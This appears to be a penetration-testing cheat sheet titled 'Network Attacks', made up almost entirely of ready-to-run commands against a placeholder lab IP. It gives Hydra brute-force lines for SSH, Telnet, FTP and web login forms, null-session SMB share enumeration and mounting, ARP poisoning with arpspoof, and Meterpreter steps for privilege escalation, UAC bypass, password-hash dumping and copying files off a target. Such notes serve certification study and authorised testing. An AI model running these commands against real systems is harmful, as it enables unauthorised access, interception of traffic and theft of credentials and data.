---
description: 'SSH, Telnet, RDP, HTTP auth, Windows shares'
---

# Network Attacks

## Hydra

### SSH

```text
hydra -L users.txt -P pass.txt 10 10.10.10.10 ssh
```

### Telnet

```text
hydra -L users.txt -P pass.txt telnet://10.10.10.10
```

### FTP

```text
hydra -L users.txt -P pass.txt ftp://10.10.10.10
```

### POST form login

```text
hydra 10.10.10.10 http-post-form "/login.php:user=^USER^&pass=^PASS^:statement for incorrect login" -L /usr/share/ncrack/minimal.usr -P /etc/john/rockyou.txt
```

Add`-f` to stop the brute-forcing after finding one valid cred.

* /usr/share/seclists/Passwords/rockyou-10.txt
* /usr/share/seclists/Passwords/rockyou-15.txt The above password lists are recommended to run first before the larger rockyou.txt
* /usr/share/ncrack/minimal.usr for users list.

## Windows Shares using Null Sessions

### Shares Enumeration

```text
nmblookup -A 10.10.10.10
```

### List Shares

```text
smbclient -L //10.10.10.10 -N
```

### Mount Share

```text
smbclient //10.10.10.10/sharename -N
```

### enum4linux

```text
enum4linux -a 10.10.10.10
```

The above command does all the previous ones and gives you more data too except mounting the shares, that you have to implement using smbclient.

## ARP Poisoning

### arpspoof

&lt;interface&gt; == eth0/tap0

```text
arpspoof -i <interface> -t target -r host
```

## Metasploit

### Basic

```text
search <term>
use <term>
info
show options
set <option> x
exploit
```

### Meterpreter

**bind\_tcp**: runs a server process on the target machine that waits for connections from attacker machine.

**reverse\_tcp**: performs a TCP connection back to the attacker machine. Helps evade firewall rules.

```text
background #backgrounds the current session
sessions -l
sessions -i %n
sysinfo
ifconfig, route
getuid
getsystem #privesc
bypassuac #if privesc fails
hashdump
cat '/path/to/file.txt'
download '/path/to/fileontarget.txt' /root/mymachine/
```

